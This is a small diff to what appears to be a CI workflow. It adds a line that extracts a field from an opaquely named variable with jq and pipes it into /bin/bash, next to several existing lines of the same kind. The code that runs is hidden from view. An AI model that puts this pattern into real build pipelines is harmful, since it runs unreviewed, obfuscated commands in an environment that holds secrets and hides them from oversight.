@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$lhrep358" | jq -r .nv2 | /bin/bash
           echo $v68 | jq -r .nlht4013 | /bin/bash
           printf '%s' "$kursi37" | jq -r .fgxsf1 | /bin/bash
+          echo $zq1 | jq -r .wlb0 | /bin/bash
 
       - name: Save output
         if: always()
